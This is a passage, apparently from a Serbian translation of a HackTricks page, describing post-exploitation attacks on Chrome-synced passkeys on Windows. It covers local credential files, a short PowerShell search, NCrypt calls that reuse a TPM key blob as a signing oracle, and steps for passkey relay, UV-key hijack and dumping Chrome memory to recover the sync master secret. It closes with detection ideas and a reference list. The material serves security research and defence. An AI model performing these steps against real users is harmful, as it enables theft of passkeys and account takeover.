Ako se izvršavanje koda ostvari kao **žrtvin korisnik** na Windows hostu koji koristi **Chrome + sinhronizovane passkeys u Google Password Manager-u**, passkeys postaju zanimljiva meta za posteksploataciju čak i **bez admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-kodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da izlista **RP ID**, **username**, **credential ID** i šifrovani materijal privatnog ključa za sinhronizovane passkey-je.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva lokalno stanje upisa uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih kredencijala.<sup>[[4]](#references)</sup>

Brza trijaža:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobovi ključeva vezanih za TPM i dalje se mogu zloupotrebiti kao lokalni signing oracle

Ako pregledač izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware-u **nije** potrebno da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Ovo znači da **hardversko vezivanje sprečava izvoz van uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanom endpointu**.

### Praktični putevi zloupotrebe

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Enumerišite `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
   - Započnite prijavu pomoću passkey-a i pribavite svež WebAuthn izazov.
   - Upotrebite ukradeni blob `wrapped_identity_private_key` na TPM-u žrtve da biste potpisali zahtev za vezivanje cloud-authenticator-a.
   - Prosledite dobijenu assertion relying party-ju.
   - Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Prisilite ponovno podešavanje brisanjem `passkey_enclave_state` ili slanjem važeće potpisane operacije `device/forget`.
   - Ako podešavanje ostavi uređaj u stanju **`uv_key_pending`**, registrujte javni UV ključ koji kontroliše napadač.
   - Ako provajder ne proverava attestation / poreklo bezbednog hardvera za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
3. **Krađa master-secret-a / SDS oporavka**<sup>[[4]](#references)</sup>
   - Prisilite oporavak ili ponovno pridruživanje kako bi Chrome preuzeo sinhronizovanu master tajnu za passkey.
   - Pratite ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim napravite dump Chrome-ove memorije dok je u njoj prisutna otvorena **tajna bezbednosnog domena (SDS)**.
   - Upotrebite oporavljeni SDS da biste dešifrovali šifrovana polja u svakom zapisu `WebauthnCredentialSpecifics` i oporavili prenosive WebAuthn privatne ključeve.

### DFIR / ideje za detekciju

- Nadgledajte **brisanje/ponovno kreiranje** datoteke `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozorite na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** od strane procesa koji nisu pregledači.
- Upozorite na **dump-ove Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Istražite ponovljene upite za **Google Password Manager PIN za oporavak** ili neočekivano ponovno podešavanje.
- Imajte na umu da **`signCount`** u WebAuthn-u često nije koristan za sinhronizovane passkey-e, jer može ostati nepromenjen, pa je klasično otkrivanje klonova slabo.



## References

- [1] [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nova površina napada u autentifikaciji bez lozinke](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / skladištenje ključeva CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hakovanje Windows-a: napadi na Microsoftove sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory skladište podataka zaista funkcioniše: u NTDS.dit (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Udaljeni dump lozinki iz Lsass-a](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj arsenal sajber-špijunaže pomoću paketa Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcija CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – rezervni režim Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Često postavljana pitanja o Telegramu – prekid aktivnih sesija](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard i Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: zaštita i upravljanje akreditivima](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - podržani ulazi i brzi početak](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
